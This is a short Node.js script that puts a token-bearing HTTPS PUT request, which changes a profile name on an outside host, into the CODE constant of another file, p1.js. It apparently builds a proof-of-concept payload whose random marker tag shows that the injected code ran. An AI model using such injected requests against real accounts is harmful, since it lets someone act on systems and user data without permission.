const fs=require('fs');
let t=fs.readFileSync('p1.js','utf8');
const tk=fs.readFileSync('..\\tok_ml.txt','utf8').trim();
const tag='ZZ'+Math.floor(Math.random()*9000+1000);
const code=`
const https=require('https');
const body=JSON.stringify({firstName:'${tag}',lastName:'BOX'});
let n=0;
const go=()=>{
  n++;
  const opt={host:'423c088f8a3791.6qsfv.com',port:443,path:'/auth/profile',method:'PUT',headers:{'content-type':'application/json','content-length':Buffer.byteLength(body),authorization:'Bearer ${tk}'},timeout:8000};
  const r=https.request(opt,res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{console.log('t'+n+'='+res.statusCode); if(res.statusCode!==200&&n<4) setTimeout(go,2500)})});
  r.on('error',e=>{console.log('t'+n+'=ERR'); if(n<4) setTimeout(go,2500)});
  r.on('timeout',()=>{r.destroy();console.log('t'+n+'=TO'); if(n<4) setTimeout(go,2500)});
  r.write(body);r.end();
};
go();
`;
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
